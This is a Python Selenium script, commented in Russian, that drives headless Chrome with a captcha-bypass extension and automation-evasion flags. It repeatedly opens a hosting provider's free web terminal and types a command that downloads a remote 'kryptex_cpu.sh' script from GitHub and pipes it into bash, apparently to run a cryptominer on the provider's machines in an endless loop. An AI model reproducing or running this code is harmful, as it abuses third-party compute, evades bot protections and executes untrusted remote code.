import os
import shutil
import uuid
import time
import subprocess
import sys
import platform
import tempfile
import psutil
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.action_chains import ActionChains

# Конфигурация
CRX_PATH = os.path.abspath("fuckCaptcha.crx")
COMMAND = "wget -O - https://raw.githubusercontent.com/fcknjudas/fileshare_linux/refs/heads/main/kryptex_cpu.sh | bash"
MAX_FAILED_ATTEMPTS = 3
MAX_CAPTCHA_ATTEMPTS = 10
CAPTCHA_TIMEOUT = 60
TIMEOUT = 17 * 60
BASE_PROFILE_DIR = os.path.join(os.getcwd(), "chrome_profiles")

def check_and_install_dependencies():
    """Проверяет и устанавливает необходимые зависимости"""
    required_packages = {
        'selenium': '>=4.0.0',
        'webdriver-manager': '>=3.0.0',
        'psutil': '>=5.8.0',
    }
    
    print("Проверка зависимостей...")
    installed_packages = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze']).decode('utf-8')
    installed_packages = [pkg.split('==')[0].lower() for pkg in installed_packages.split('\n')]
    
    to_install = []
    for pkg, version in required_packages.items():
        if pkg.lower() not in installed_packages:
            to_install.append(f"{pkg}{version}")
    
    if to_install:
        print(f"Установка недостающих пакетов: {', '.join(to_install)}")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', *to_install])
    else:
        print("Все зависимости уже установлены")

def kill_chrome_processes():
    """Убивает все процессы Chrome и ChromeDriver"""
    print("Завершение всех процессов Chrome и ChromeDriver...")
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] in ('chrome', 'chromedriver', 'chrome.exe', 'chromedriver.exe'):
                print(f"Завершение процесса {proc.info['name']} (PID: {proc.info['pid']})")
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    time.sleep(2)

def cleanup_profile(profile_path):
    """Удаляет профиль Chrome"""
    if not profile_path or not os.path.exists(profile_path):
        return
        
    print(f"Очистка профиля {profile_path}...")
    try:
        for _ in range(3):
            try:
                shutil.rmtree(profile_path, ignore_errors=True)
                if not os.path.exists(profile_path):
                    break
            except Exception as e:
                print(f"Ошибка при удалении профиля (попытка {_+1}): {e}")
            time.sleep(1)
    except Exception as e:
        print(f"Ошибка при очистке профиля: {e}")

def wait_for_recaptcha_disappear(driver, timeout=60):
    """Ожидает исчезновения reCAPTCHA"""
    print(f"Ожидание исчезновения reCAPTCHA (макс {timeout} сек)...")
    try:
        WebDriverWait(driver, timeout).until(
            EC.invisibility_of_element_located(
                (By.CSS_SELECTOR, "iframe[src*='recaptcha']")))
        print("reCAPTCHA исчезла")
        time.sleep(5)
        return True
    except Exception as e:
        print(f"reCAPTCHA не исчезла за отведенное время: {e}")
        return False

def setup_driver(use_profile=True, profile_path=None):
    """Настраивает ChromeDriver с двумя вариантами инициализации"""
    chrome_options = Options()
    
    if use_profile and profile_path:
        # Вариант 1: С использованием user-data-dir
        chrome_options.add_argument(f"--user-data-dir={profile_path}")
        chrome_options.add_extension(CRX_PATH)
    else:
        # Вариант 2: Без профиля (используем временный каталог для расширения)
        temp_dir = tempfile.mkdtemp()
        extension_path = os.path.join(temp_dir, os.path.basename(CRX_PATH))
        shutil.copy2(CRX_PATH, extension_path)
        chrome_options.add_extension(extension_path)
    
    # Общие настройки
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        return driver
    except Exception as e:
        print(f"Ошибка при инициализации ChromeDriver: {e}")
        raise

def execute_commands(driver, attempt):
    """Выполняет основную последовательность действий"""
    driver.get("https://terminator.aeza.net/ru/")
    print("Сайт открыт")
    time.sleep(3)

    # Нажатие первой кнопки
    try:
        button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="window"]/div[1]/div[1]/button[2]')))
        button.click()
        print("Первая кнопка нажата")
    except Exception as e:
        print(f"Ошибка при нажатии кнопки: {str(e)}")
        driver.save_screenshot(f"error_button_{attempt}.png")
        return False

    # Обработка капчи
    for captcha_attempt in range(1, MAX_CAPTCHA_ATTEMPTS + 1):
        print(f"\nПроверка капчи - попытка {captcha_attempt}/{MAX_CAPTCHA_ATTEMPTS}")
        if wait_for_recaptcha_disappear(driver, CAPTCHA_TIMEOUT):
            break
        else:
            print("Капча не исчезла, перезагрузка страницы...")
            driver.refresh()
            time.sleep(5)
            try:
                button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, '//*[@id="window"]/div[1]/div[1]/button[2]')))
                button.click()
                print("Кнопка нажата после перезагрузки")
            except Exception as e:
                print(f"Ошибка при нажатии кнопки после перезагрузки: {str(e)}")
                driver.save_screenshot(f"error_reload_{attempt}.png")
                if captcha_attempt == MAX_CAPTCHA_ATTEMPTS:
                    return False
                continue

    # Ввод команды
    try:
        textarea = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, 'xterm-helper-textarea')))
        ActionChains(driver).click(textarea).perform()
        textarea.clear()
        textarea.send_keys(COMMAND)
        textarea.send_keys(Keys.RETURN)
        print("Команда успешно выполнена")

        print(f"Ожидание {TIMEOUT//60} минут...")
        time.sleep(TIMEOUT)
        return True
    except Exception as e:
        print(f"Ошибка вставки команды: {str(e)}")
        driver.save_screenshot(f"error_command_{attempt}.png")
        return False

def run_attempt(attempt):
    print(f"\n=== Попытка {attempt}/{MAX_FAILED_ATTEMPTS} ===")

    if not os.path.exists(CRX_PATH):
        print(f"Ошибка: Файл расширения {CRX_PATH} не найден!")
        return False

    # Создаем профиль (для первого варианта)
    profile_name = f"profile_{uuid.uuid4()}"
    profile_path = os.path.join(BASE_PROFILE_DIR, profile_name)
    os.makedirs(profile_path, exist_ok=True)
    
    # Пробуем оба варианта
    for use_profile in [False, True]:
        driver = None
        try:
            print(f"\nИнициализация драйвера (use_profile={use_profile})")
            driver = setup_driver(use_profile=use_profile, profile_path=profile_path if use_profile else None)
            
            if execute_commands(driver, attempt):
                return True
                
        except WebDriverException as e:
            print(f"Ошибка WebDriver: {str(e)}")
            if driver:
                driver.save_screenshot(f"critical_error_{attempt}_{'profile' if use_profile else 'temp'}.png")
            if use_profile:
                return False
            continue
        except Exception as e:
            print(f"Неожиданная ошибка: {str(e)}")
            return False
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception as e:
                    print(f"Ошибка при закрытии драйвера: {e}")
            if use_profile:
                cleanup_profile(profile_path)
    
    return False

def main():
    # Проверяем зависимости перед стартом
    check_and_install_dependencies()
    os.makedirs(BASE_PROFILE_DIR, exist_ok=True)
    kill_chrome_processes()

    while True:
        for attempt in range(1, MAX_FAILED_ATTEMPTS + 1):
            if run_attempt(attempt):
                print("Успешное завершение! Перезапуск через 10 секунд...")
                time.sleep(10)
                break
            else:
                print(f"Попытка {attempt} не удалась")
                if attempt < MAX_FAILED_ATTEMPTS:
                    print("Перезапуск через 10 секунд...")
                    time.sleep(10)
        else:
            print(f"Все {MAX_FAILED_ATTEMPTS} попыток завершились неудачно")
            print("Перезапуск через 30 секунд...")
            time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nЗавершение работы по запросу пользователя...")
    finally:
        kill_chrome_processes()
        print("Все процессы Chrome завершены")
